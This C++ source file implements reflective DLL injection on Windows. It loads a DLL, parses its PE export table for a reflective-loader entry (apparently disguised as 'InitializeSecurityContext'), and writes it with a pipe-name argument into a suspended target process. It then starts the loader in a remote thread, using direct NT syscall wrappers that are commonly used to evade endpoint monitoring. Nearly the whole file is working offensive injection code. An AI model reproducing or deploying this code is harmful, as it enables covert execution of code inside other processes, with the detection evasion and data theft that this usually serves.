// InjectionEngine.cpp - Low-level PE injection and execution
#include "InjectionEngine.h"
#include "syscalls.h"
#include <fstream>
#include <stdexcept>

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

extern std::string g_securityModulePath;

// Constructor initializes injection context
InjectionManager::InjectionManager(TargetProcess& target, const Console& console) 
    : m_target(target), m_console(console) {}

// Main injection workflow execution
void InjectionManager::execute(const std::wstring& pipeName)
{
    m_console.Debug("Loading security module from file: " + g_securityModulePath);
    loadSecurityModuleFromFile(g_securityModulePath);

    m_console.Debug("Parsing module PE headers for InitializeSecurityContext entry point.");
    DWORD rdiOffset = getInitializeSecurityContextOffset();
    if (rdiOffset == 0)
        throw std::runtime_error("Could not find InitializeSecurityContext export in security module.");
    m_console.Debug("InitializeSecurityContext found at file offset: " + Utils::PtrToHexStr((void*)(uintptr_t)rdiOffset));

    m_console.Debug("Allocating memory for security module in target process.");
    PVOID remoteModuleBase = nullptr;
    SIZE_T moduleSize = m_moduleBuffer.size();
    SIZE_T pipeNameByteSize = (pipeName.length() + 1) * sizeof(wchar_t);
    SIZE_T totalAllocationSize = moduleSize + pipeNameByteSize;

    NTSTATUS status = NtAllocateVirtualMemory_syscall(m_target.getProcessHandle(), &remoteModuleBase, 0,
                                                    &totalAllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status))
        throw std::runtime_error("NtAllocateVirtualMemory failed: " + Utils::NtStatusToString(status));
    m_console.Debug("Combined memory for module and parameters allocated at: " + Utils::PtrToHexStr(remoteModuleBase));
    
    m_console.Debug("Writing security module to target process memory.");
    SIZE_T bytesWritten = 0;
    status = NtWriteVirtualMemory_syscall(m_target.getProcessHandle(), remoteModuleBase,
                                        m_moduleBuffer.data(), moduleSize, &bytesWritten);
    if (!NT_SUCCESS(status))
        throw std::runtime_error("NtWriteVirtualMemory for security module failed: " + Utils::NtStatusToString(status));

    m_console.Debug("Writing pipe name parameter into the same allocation.");
    LPVOID remotePipeNameAddr = reinterpret_cast<PBYTE>(remoteModuleBase) + moduleSize;
    status = NtWriteVirtualMemory_syscall(m_target.getProcessHandle(), remotePipeNameAddr,
                                        (PVOID)pipeName.c_str(), pipeNameByteSize, &bytesWritten);
    if (!NT_SUCCESS(status))
        throw std::runtime_error("NtWriteVirtualMemory for pipe name failed: " + Utils::NtStatusToString(status));
    
    m_console.Debug("Changing module memory protection to executable.");
    ULONG oldProtect = 0;
    status = NtProtectVirtualMemory_syscall(m_target.getProcessHandle(), &remoteModuleBase,
                                          &totalAllocationSize, PAGE_EXECUTE_READ, &oldProtect);
    if (!NT_SUCCESS(status))
        throw std::runtime_error("NtProtectVirtualMemory failed: " + Utils::NtStatusToString(status));

    startSecurityThreadInTarget(remoteModuleBase, rdiOffset, remotePipeNameAddr);
    m_console.Debug("New thread created for security module. Main thread remains suspended.");
}

// Reads DLL file into memory buffer
void InjectionManager::loadSecurityModuleFromFile(const std::string& modulePath)
{
    if (!fs::exists(modulePath))
        throw std::runtime_error("Security module not found: " + modulePath);

    std::ifstream file(modulePath, std::ios::binary);
    if (!file)
        throw std::runtime_error("Failed to open security module: " + modulePath);

    file.seekg(0, std::ios::end);
    auto fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    m_moduleBuffer.resize(static_cast<size_t>(fileSize));
    file.read(reinterpret_cast<char*>(m_moduleBuffer.data()), fileSize);

    if (!file)
        throw std::runtime_error("Failed to read security module: " + modulePath);

    m_console.Debug("Loaded " + std::to_string(m_moduleBuffer.size()) + " bytes from " + modulePath);
}

// Manually parses PE export table to locate entry point
DWORD InjectionManager::getInitializeSecurityContextOffset()
{
    auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(m_moduleBuffer.data());
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
        return 0;

    auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>((uintptr_t)m_moduleBuffer.data() + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
        return 0;

    auto exportDirRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportDirRva == 0)
        return 0;
    
    // Converts RVA to file offset using section headers
    auto RvaToOffset = [&](DWORD rva) -> PVOID
    {
        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
        for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i, ++section)
        {
            if (rva >= section->VirtualAddress && rva < section->VirtualAddress + section->Misc.VirtualSize)
            {
                return (PVOID)((uintptr_t)m_moduleBuffer.data() + section->PointerToRawData + (rva - section->VirtualAddress));
            }
        }
        return nullptr;
    };

    auto exportDir = (PIMAGE_EXPORT_DIRECTORY)RvaToOffset(exportDirRva);
    if (!exportDir) return 0;

    auto names = (PDWORD)RvaToOffset(exportDir->AddressOfNames);
    auto ordinals = (PWORD)RvaToOffset(exportDir->AddressOfNameOrdinals);
    auto funcs = (PDWORD)RvaToOffset(exportDir->AddressOfFunctions);
    if (!names || !ordinals || !funcs) return 0;
    
    // Search for specific export by name
    for (DWORD i = 0; i < exportDir->NumberOfNames; ++i)
    {
        char* funcName = (char*)RvaToOffset(names[i]);
        if (funcName && strcmp(funcName, "InitializeSecurityContext") == 0)
        {
            PVOID funcOffsetPtr = RvaToOffset(funcs[ordinals[i]]);
            if (!funcOffsetPtr) return 0;
            return (DWORD)((uintptr_t)funcOffsetPtr - (uintptr_t)m_moduleBuffer.data());
        }
    }
    return 0;
}

// Creates remote thread at calculated entry point
void InjectionManager::startSecurityThreadInTarget(PVOID remoteModuleBase, DWORD rdiOffset, PVOID remotePipeNameAddr)
{
    m_console.Debug("Creating new thread in target to execute InitializeSecurityContext.");

    uintptr_t entryPoint = reinterpret_cast<uintptr_t>(remoteModuleBase) + rdiOffset;
    HANDLE hRemoteThread = nullptr;

    NTSTATUS status = NtCreateThreadEx_syscall(&hRemoteThread, THREAD_ALL_ACCESS, nullptr, m_target.getProcessHandle(),
                                             (LPTHREAD_START_ROUTINE)entryPoint, remotePipeNameAddr, 0, 0, 0, 0, nullptr);

    UniqueHandle remoteThreadGuard(hRemoteThread);

    if (!NT_SUCCESS(status))
        throw std::runtime_error("NtCreateThreadEx failed: " + Utils::NtStatusToString(status));

    m_console.Debug("Successfully created new thread for security module.");
}